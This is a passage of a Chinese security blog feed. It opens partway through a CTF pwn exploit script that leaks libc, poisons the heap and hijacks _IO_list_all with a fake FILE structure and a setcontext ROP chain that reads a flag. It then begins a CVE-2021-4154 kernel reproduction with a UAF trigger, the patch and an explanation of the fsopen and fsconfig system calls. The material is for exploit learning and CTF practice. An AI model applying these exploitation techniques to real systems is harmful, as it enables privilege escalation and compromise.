class="hljs-number">4</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">6</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x420</span>)<br><br>edit(<span class="hljs-number">2</span>, publish_data=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x78</span>+<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">2</span>)<br><br>ru(<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21add0</span><br><br><br>edit(<span class="hljs-number">2</span>,publish_data=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x41</span>) + p64(heap_base+<span class="hljs-number">0x3a50</span>)+p64(heap_base+<span class="hljs-number">0x3a90</span>)+p64(heap_base+<span class="hljs-number">0x3ad0</span>)+p64(heap_base+<span class="hljs-number">0x3b10</span>)<br>     +<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x101</span>))<br><br><br><br><br>add(<span class="hljs-number">3</span>, title=<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;y&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x30</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">1</span>,title=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x41</span>)<br>     +p64(heap_base+<span class="hljs-number">0x3860</span>) + p64(heap_base+<span class="hljs-number">0x3830</span>) + p64(heap_base+<span class="hljs-number">0x3800</span>) + p64(heap_base+<span class="hljs-number">0x37d0</span>)<br>     + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x41</span>) + p64(heap_base+<span class="hljs-number">0x3910</span>) + p64(heap_base+<span class="hljs-number">0x3950</span>)+<br>     p64(heap_base+<span class="hljs-number">0x3990</span>) + p64(heap_base+<span class="hljs-number">0x39d0</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x41</span>) + p64(libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]^((heap_base+<span class="hljs-number">0x3000</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br>pop_rdi = libc.address + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi = libc.address + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_r12 = libc.address + <span class="hljs-number">0x000000000011f2e7</span><br>pop_rax = libc.address + <span class="hljs-number">0x0000000000045eb0</span><br>ret = libc.address + <span class="hljs-number">0x00000000000f9b02</span><br>syscall_ret = libc.address + <span class="hljs-number">0x0000000000091316</span><br>magic = <span class="hljs-number">0x0000000000167420</span> + libc.address<br>_IO_wfile_jumps = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>_fake_wide_data_addr = heap_base + <span class="hljs-number">0x23b0</span><br>rop_addr = heap_base+<span class="hljs-number">0x2630</span><br><br>_IO_file = p64(<span class="hljs-number">0</span>) + p64(rop_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_fake_wide_data_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_IO_wfile_jumps)<br><br>wide_data = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>wide_data += p64(_fake_wide_data_addr + <span class="hljs-number">0xe0</span>)<br>wide_data += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(magic)<br><br>rop = <span class="hljs-string">b&#x27;flag\x00\x00&#x27;</span><br>rop = rop.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(setcontext + <span class="hljs-number">61</span>)<br>rop = rop.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(rop_addr + <span class="hljs-number">0xb0</span>) + p64(ret)<br>rop += p64(pop_rdi) + p64(rop_addr)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#read</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">0</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#write</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">1</span>)<br>rop += p64(syscall_ret)<br><br>add(<span class="hljs-number">2</span>,title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>,author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">4</span>,title=p64(heap_base+<span class="hljs-number">0x3420</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xfbad2086</span>)+p64(<span class="hljs-number">0</span>),author=_IO_file,isbn=wide_data,publish_data=rop)<br><span class="hljs-comment"># gdb.attach(p)</span><br><br><br>leak(<span class="hljs-string">&quot;heap&quot;</span>,heap_base)<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;6&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="vm（赛后remake-from-inkey"><a href="#vm（赛后remake-from-inkey" class="headerlink" title="vm（赛后remake from inkey)"></a>vm（赛后remake from inkey)</h2><p>inkey👴磕了一天终于出了，太tm顶了</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-4154 Remake</title>
    <link href="/2024/03/28/dirtycred/"/>
    <url>/2024/03/28/dirtycred/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00：写在所有之前"><a href="#0x00：写在所有之前" class="headerlink" title="0x00：写在所有之前"></a>0x00：写在所有之前</h1><p>又是一个无地址泄露<strong>CVE</strong>的复现！</p><p>本文所用的源码均为<code>linux 5.8.0</code></p><h1 id="0x01：信息搜集"><a href="#0x01：信息搜集" class="headerlink" title="0x01：信息搜集"></a>0x01：信息搜集</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4154">NVD - CVE-2021-4154 (nist.gov)</a></p><p>影响版本非常广</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240328081341.png" style="zoom:80%;" /><p>康一眼<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3b0462726e7ef281c35a7a4ae33e93ee2bc9975b">commit</a></p><p>下面这个<code>poc</code>可以造成<strong>UAF</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//The following sequence can be used to trigger a UAF:</span><br><span class="hljs-type">int</span> fscontext_fd = fsopen(<span class="hljs-string">&quot;cgroup&quot;</span>);<br><span class="hljs-type">int</span> fd_null = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDONLY);<br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, fd_null)</span>;<br>close_range(<span class="hljs-number">3</span>, ~<span class="hljs-number">0U</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>这个是<code>patch</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c<br>index ee93b6e8958746.<span class="hljs-number">.527917</span>c0b30be4 <span class="hljs-number">100644</span><br>--- a/kernel/cgroup/cgroup-v1.c<br>+++ b/kernel/cgroup/cgroup-v1.c<br>@@ <span class="hljs-number">-912</span>,<span class="hljs-number">6</span> +<span class="hljs-number">912</span>,<span class="hljs-number">8</span> @@ <span class="hljs-type">int</span> <span class="hljs-title function_">cgroup1_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br> opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br> <span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>+<span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br>+<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Non-string source&quot;</span>);<br> <span class="hljs-keyword">if</span> (fc-&gt;source)<br> <span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Multiple sources not supported&quot;</span>);<br> fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br></code></pre></td></tr></table></figure><p>以上便是收集到的资料</p><h1 id="0x02：前置知识"><a href="#0x02：前置知识" class="headerlink" title="0x02：前置知识"></a>0x02：前置知识</h1><h2 id="新一代mount系统调用"><a href="#新一代mount系统调用" class="headerlink" title="新一代mount系统调用"></a>新一代mount系统调用</h2><p>这大概是<strong>VFS</strong>的胜利🤔</p><p>先来康一下老版本的<code>mount</code>是怎么用的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;  <br>        <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-string">&quot;/mnt/tmp&quot;</span>, <span class="hljs-string">&quot;xfs&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;  <br>                perror(<span class="hljs-string">&quot;mount failed&quot;</span>);  <br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>简单粗暴，一个函数直接完事</p><p>but新的<strong>mount API</strong>将过去封装的一个“臃肿”的<strong>mount</strong>拆分成了若干个系统调用（或者说若干个独立的阶段）</p><p>首先是<strong>fsopen</strong></p><h2 id="fsopen"><a href="#fsopen" class="headerlink" title="fsopen"></a>fsopen</h2><p>很粗暴的系统调用的封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>**fsopen()<strong>，功能与</strong>open()<strong>系统调用非常相似。当</strong>open()<strong>用于打开一个文件并获取与之相关的文件描述符fd时，</strong>fsopen()**则旨在打开一个文件系统，并获取该文件系统的上下文。随后，它会将这个文件系统上下文与一个文件描述符绑定，并返回该文件描述符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Open a filesystem by name so that it can be configured for mounting.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We are allowed to specify a container in which the filesystem will be</span><br><span class="hljs-comment"> * opened, thereby indicating which namespaces will be used (notably, which</span><br><span class="hljs-comment"> * network namespace will be used for network filesystems).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-comment">//使用ns_capable函数检查当前进程的命名空间是否具有CAP_SYS_ADMIN权限</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><span class="hljs-comment">//检查传入的flags参数是否包含除了FSOPEN_CLOEXEC之外的其他位</span><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-comment">//使用strndup_user函数从用户空间复制文件系统的名称，这个名称的长度限制为PAGE_SIZE</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><span class="hljs-comment">//根据文件系统名称获取file_system_type结构</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><span class="hljs-comment">//创建一个上下文fc</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<span class="hljs-comment">//减少文件系统类型的引用计数。</span><br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><span class="hljs-comment">//表示正在创建挂载参数</span><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><span class="hljs-comment">//分配一个日志上下文</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><span class="hljs-comment">//创建一个文件描述符，如果flags包含FSOPEN_CLOEXEC，则使用O_CLOEXEC标志</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<strong>fs_context</strong>是随着这一批新的系统调用一起引入的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br>    <span class="hljs-comment">//文件系统上下文实例持续期间，提供给文件系统上下文使用的众多方法。一般由特定文件系统类型的init_fs_context方法来对其进行设置。</span><br>        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span>            <span class="hljs-title">uapi_mutex</span>;</span>     <span class="hljs-comment">/* Userspace access mutex */</span><br>    <span class="hljs-comment">//用来指向即将被挂载（或重新配置）的文件系统所属文件系统类型实例的指针</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><br>    <span class="hljs-comment">//指向文件系统私有数据的指针，常用于存储需要特定文件系统来解析的选项</span><br>        <span class="hljs-type">void</span>                    *fs_private;    <span class="hljs-comment">/* The filesystem&#x27;s context */</span><br>        <span class="hljs-type">void</span>                    *sget_key;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>           *<span class="hljs-title">root</span>;</span>          <span class="hljs-comment">/* The root and superblock */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>   *<span class="hljs-title">user_ns</span>;</span>       <span class="hljs-comment">/* The user namespace for this mount */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>              *<span class="hljs-title">net_ns</span>;</span>        <span class="hljs-comment">/* The network namespace for this mount */</span><br>        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>       *<span class="hljs-title">cred</span>;</span>          <span class="hljs-comment">/* The mounter&#x27;s credentials */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>           *<span class="hljs-title">log</span>;</span>           <span class="hljs-comment">/* Logging buffer */</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *source;        <span class="hljs-comment">/* The source name (eg. dev path) */</span><br>        <span class="hljs-type">void</span>                    *security;      <span class="hljs-comment">/* Linux S&amp;M options */</span><br>        <span class="hljs-type">void</span>                    *s_fs_info;     <span class="hljs-comment">/* Proposed s_fs_info */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            sb_flags;       <span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            sb_flags_mask;  <span class="hljs-comment">/* Superblock flags that were changed */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            s_iflags;       <span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            lsm_flags;      <span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span> <span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span>   <span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;        <span class="hljs-comment">/* The phase the context is in */</span><br>        <span class="hljs-type">bool</span>                    need_free:<span class="hljs-number">1</span>;    <span class="hljs-comment">/* Need to call ops-&gt;free() */</span><br>        <span class="hljs-type">bool</span>                    global:<span class="hljs-number">1</span>;       <span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>PS：注意这里打开的不是一个具体的<code>on-disk</code>文件系统（如&#x2F;dev&#x2F;sdb1上的文件系统)，而是一个文件系统“类型”</p><p>获取了针对文件系统的文件描述符后，接下来步骤是使用**fsconfig()**来对这个文件系统上下文进行配置</p><h2 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br></code></pre></td></tr></table></figure><p>详细一点的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * sys_fsconfig - Set parameters and trigger actions on a context</span><br><span class="hljs-comment"> * @fd: The filesystem context to act upon</span><br><span class="hljs-comment"> * @cmd: The action to take</span><br><span class="hljs-comment"> * @_key: Where appropriate, the parameter key to set</span><br><span class="hljs-comment"> * @_value: Where appropriate, the parameter value to set</span><br><span class="hljs-comment"> * @aux: Additional information for the value</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This system call is used to set parameters on a context, including</span><br><span class="hljs-comment"> * superblock settings, data source and security labelling.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Actions include triggering the creation of a superblock and the</span><br><span class="hljs-comment"> * reconfiguration of the superblock attached to the specified context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * When setting a parameter, @cmd indicates the type of value being proposed</span><br><span class="hljs-comment"> * and @_key indicates the parameter to be altered.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @_value and @aux are used to specify the value, should a value be required:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_flag: No value is specified.  The parameter must be boolean</span><br><span class="hljs-comment"> *     in nature.  The key may be prefixed with &quot;no&quot; to invert the</span><br><span class="hljs-comment"> *     setting. @_value must be NULL and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_string: A string value is specified.  The parameter can be</span><br><span class="hljs-comment"> *     expecting boolean, integer, string or take a 